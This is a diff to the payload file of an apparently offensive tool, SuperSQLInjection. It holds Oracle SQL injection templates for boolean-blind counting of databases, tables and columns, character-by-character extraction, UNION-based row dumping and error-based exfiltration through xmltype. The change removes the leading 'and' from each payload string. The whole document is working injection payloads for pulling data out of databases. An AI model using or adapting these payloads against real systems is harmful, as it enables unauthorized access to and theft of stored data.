@@ -34,11 +34,11 @@ namespace SuperSQLInjection.payload
 
 
         //获取数据库数量bool方式
-        public static String bool_db_count = " and " + dbs_count + ">{len}";
+        public static String bool_db_count = " " + dbs_count + ">{len}";
         //获取表数量bool
-        public static String bool_tables_count = " and " + tables_count + ">{len}";
+        public static String bool_tables_count = " " + tables_count + ">{len}";
         //获取列数量bool
-        public static String bool_columns_count = " and " + columns_count + ">{len}";
+        public static String bool_columns_count = " " + columns_count + ">{len}";
         
 
 
@@ -47,10 +47,10 @@ namespace SuperSQLInjection.payload
         public static String hex_value = "rawtohex(substr({data},{index},1))";
         
         //bool方式字符长度判断
-        public static String bool_length = " and length({data})>{len}";
+        public static String bool_length = " length({data})>{len}";
 
         //bool方式获取值
-        public static String bool_value = " and ascii(substr({data},{index},1))>{len}";
+        public static String bool_value = " ascii(substr({data},{index},1))>{len}";
 
         //获取行数据
         public static String data_value = "(select {data} from (select {allcolumns},rownum as limit from (select * from {dbname}.{table}))  where limit={index})";
@@ -58,15 +58,15 @@ namespace SuperSQLInjection.payload
 
         //union获取数据条数
         public static String union_data_count = "(select count(*) from {dbname}.{table})";
-        public static String bool_datas_count = " and " + union_data_count + ">={len}";
+        public static String bool_datas_count = " " + union_data_count + ">={len}";
 
         //union获取值
-        public static String union_value = " and 1=2 union all select {data} from dual";
+        public static String union_value = " 1=2 union all select {data} from dual";
 
         //error方式
-        public static String error_value = " and 1=(select upper(xmltype(chr(60)||chr(58)||chr(45)||chr(45)||chr(58)||rawtohex(cast(({data}) as varchar(256)))||chr(58)||chr(45)||chr(45)||chr(62))) from dual)";
+        public static String error_value = " 1=(select upper(xmltype(chr(60)||chr(58)||chr(45)||chr(45)||chr(58)||rawtohex(cast(({data}) as varchar(256)))||chr(58)||chr(45)||chr(45)||chr(62))) from dual)";
 
-        public static String substr_error_value = " and 1=(select upper(xmltype(chr(60)||chr(58)||chr(45)||chr(45)||chr(58)||substr(rawtohex(cast(({data}) as varchar(256))),{start},{len})||chr(58)||chr(45)||chr(45)||chr(62))) from dual)";
+        public static String substr_error_value = " 1=(select upper(xmltype(chr(60)||chr(58)||chr(45)||chr(45)||chr(58)||substr(rawtohex(cast(({data}) as varchar(256))),{start},{len})||chr(58)||chr(45)||chr(45)||chr(62))) from dual)";
 
         public static String getUnionDataValue(int columnsLen, int showIndex, String dataPayLoad, String dbname, String table, String index)
         {
